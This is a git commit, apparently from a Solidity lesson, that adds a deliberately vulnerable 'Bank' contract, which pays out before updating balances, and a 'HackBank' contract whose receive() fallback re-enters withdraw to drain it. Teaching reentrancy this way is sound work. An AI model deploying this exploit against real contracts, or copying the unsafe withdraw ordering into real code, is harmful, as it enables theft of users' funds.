3c0649dba7a8eec570c9ffb5a8c8f7c44e877c5a
Maksim <maksim.kalashynski@gmail.com>
2022-10-03 18:19:22 +0300

    Reentrancy attack

--- lesson_23_timelock/Lock.sol
+++ lesson_23_timelock/Lock.sol
@@ -1,6 +1,55 @@
-// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+pragma solidity 0.8.17;
 
-contract Lock{
-    
+contract Bank {
+
+    mapping(address => uint256) public balances;
+
+    constructor() payable {
+        require(msg.value == 2 ether);
+    }
+
+    function deposit() external payable {
+        balances[msg.sender] = msg.value;
+    }
+
+    function withdraw(uint256 amount) external {
+        require(amount <= balances[msg.sender], "insufficient funds");
+
+        (bool success, ) = msg.sender.call{value: amount}("");
+        require(success, "withdraw failed");
+        balances[msg.sender] -= amount;
+    }
+
+    function getBalance() view public returns(uint balance){
+        balance = address(this).balance;
+    }
 }
+
+contract HackBank{
+    Bank bank;
+    uint256 funds;
+    constructor (address _address){
+        bank = Bank(_address);
+    }
+
+    function proxyDeposit() external payable {
+        funds = msg.value;
+        bank.deposit{value : msg.value}();
+    }
+
+    function attack() external payable {
+        bank.withdraw(funds);
+    }
+
+    receive() external payable {
+        if (bank.getBalance() >= funds) {
+            bank.withdraw(funds);                }
+        
+    }
+
+    function getBalance() view public returns(uint balance){
+                    balance = address(this).balance;
+    
+    }
+ }
+
